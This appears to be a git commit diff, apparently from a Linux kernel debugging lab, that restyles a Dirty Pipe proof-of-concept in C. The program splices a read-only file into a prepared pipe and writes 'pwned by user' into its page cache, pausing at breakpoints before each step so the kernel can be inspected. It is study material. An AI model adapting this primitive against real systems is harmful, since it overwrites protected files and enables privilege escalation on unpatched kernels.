9d93172b0e9a2f92bd9a41ed5245ca28ca095180
kali-vm-main <foo@bar.baz>
2022-05-19 17:48:06 +0200

    Added code styling and makefile

--- lkd_dirtypipe_files.dir/poc.c
+++ lkd_dirtypipe_files.dir/poc.c
@@ -4,70 +4,79 @@
 #define __USE_GNU
 #include <fcntl.h>
 #include <stdio.h>
-#define PAGESIZE 	4096
+#define PAGESIZE    4096
 #define F_SETPIPE_SZ    1031
 
-void pause_for_inspection(char *msg)
-{
-  puts(msg);
-  __asm__("int $0x3\n");
+void
+pause_for_inspection(char* msg) {
+    puts(msg);
+    __asm__("int $0x3\n");
 }
 
-void fill_pipe(int pipefd_w)
-{
-  for(int i = 1; i <= PAGESIZE/8; i++)
-  {
-    if ( i == 1 ) 
-    {
-      pause_for_inspection("About to perform first write() to pipe");  
+void
+fill_pipe(int pipefd_w) {
+    for (int i = 1; i <= PAGESIZE / 8; i++) {
+        if (i == 1) {
+            pause_for_inspection("About to perform first write() to pipe");
+        }
+        if (i == PAGESIZE / 8) {
+            pause_for_inspection("About to perform last write() to pipe");
+        }
+        if (write(pipefd_w, "AAAAAAAA", 8) != 8) {
+            exit(1);
+        }
     }
-    if ( i == PAGESIZE/8 )
-    {
-      pause_for_inspection("About to perform last write() to pipe"); 
+}
+
+void
+drain_pipe(int pipefd_r) {
+    char buf[8];
+    for (int i = 1; i <= PAGESIZE / 8; i++) {
+        if (i == PAGESIZE / 8) {
+            pause_for_inspection("About to perform last read() from pipe");
+        }
+        if (read(pipefd_r, buf, 8) != 8) {
+            exit(1);
+        }
     }
-    if(write(pipefd_w, "AAAAAAAA", 8)!=8) { exit(1); }
-  }
 }
 
-void drain_pipe(int pipefd_r)
-{
-  char buf[8];
-  for(int i = 1; i <= PAGESIZE/8; i++)
-  {
-    if (i == PAGESIZE/8)
-    {
-      pause_for_inspection("About to perform last read() from pipe"); 
+void
+setup_pipe(int pipefd_r, int pipefd_w) {
+    if (fcntl(pipefd_w, F_SETPIPE_SZ, PAGESIZE) != PAGESIZE) {
+        exit(7);
     }
-    if(read(pipefd_r, buf, 8)!=8) { exit(1); }
-  }
+    fill_pipe(pipefd_w);
+    drain_pipe(pipefd_r);
 }
 
-void setup_pipe(int pipefd_r, int pipefd_w)
-{
-  if(fcntl(pipefd_w, F_SETPIPE_SZ, PAGESIZE) != PAGESIZE) { exit(7); }
-  fill_pipe(pipefd_w);
-  drain_pipe(pipefd_r);
+void
+main() {
+    int pipefds[2];
+    int tfd;
+
+    pause_for_inspection("About to open() file");
+    tfd = open("./target_file", O_RDONLY);
+    if (tfd < 0) {
+        exit(1);
+    }
+
+    pause_for_inspection("About to create pipe()");
+    if (pipe(pipefds)) {
+        exit(1);
+    }
+
+    setup_pipe(pipefds[0], pipefds[1]);
+
+    pause_for_inspection("About to splice() file to pipe");
+    if (splice(tfd, 0, pipefds[1], 0, 5, 0) < 0) {
+        exit(1);
+    }
+
+    pause_for_inspection("About to write() into page cache");
+    if (write(pipefds[1], "pwned by user", 13) != 13) {
+        exit(1);
+    }
+
+    exit(0);
 }
-
-void main()
-{
-  int pipefds[2];
-  int tfd;
-
-  pause_for_inspection("About to open() file"); 
-  tfd = open("./target_file", O_RDONLY);
-  if(tfd<0) { exit(1); }
-
-  pause_for_inspection("About to create pipe()"); 
-  if(pipe(pipefds)) { exit(1); }
-
-  setup_pipe(pipefds[0], pipefds[1]);
-
-  pause_for_inspection("About to splice() file to pipe");
-  if(splice(tfd, 0, pipefds[1], 0, 5, 0)<0) { exit(1); }
-
-  pause_for_inspection("About to write() into page cache");
-  if(write(pipefds[1], "pwned by user", 13)!=13) { exit(1); }
-
-  exit(0);
-}	  
